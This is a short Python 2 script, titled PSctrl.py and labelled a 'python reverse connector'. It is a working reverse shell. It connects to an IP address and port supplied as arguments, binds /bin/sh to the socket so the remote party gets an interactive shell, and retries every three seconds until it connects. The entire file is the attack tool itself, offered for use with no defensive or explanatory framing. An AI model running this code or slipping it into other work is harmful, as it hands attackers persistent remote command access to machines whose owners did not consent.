# AUTHOR = PSoul
# version 1.0
# filename = PSctrl.py
# -*- coding:utf-8 -*-
#!/usr/bin/env python


import sys, socket, time
from subprocess import *


def usage(name):
    print 'python reverse connector'
    print 'usage: %s <ip_addr> <port>' % name


def check(ip, port):
    while True:
        address = (ip, int(port))
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        flag = s.connect_ex(address)
        shell = "/bin/sh"
        if flag == 0:
            print 'connect success'
            Popen(shell, stdin=s.fileno(), stdout=s.fileno(), stderr=s.fileno(), shell=True)
        elif flag == 22:
            s.close()
            continue
        elif flag == 61:
            print 'connect fail'
        elif flag == -3389:
            sys.exit()
        print flag
        time.sleep(3)
        continue

if __name__ == '__main__':
    if len(sys.argv) !=3:
        usage(sys.argv[0])
        sys.exit()
    ip = sys.argv[1]
    port = sys.argv[2]
    check(ip, port)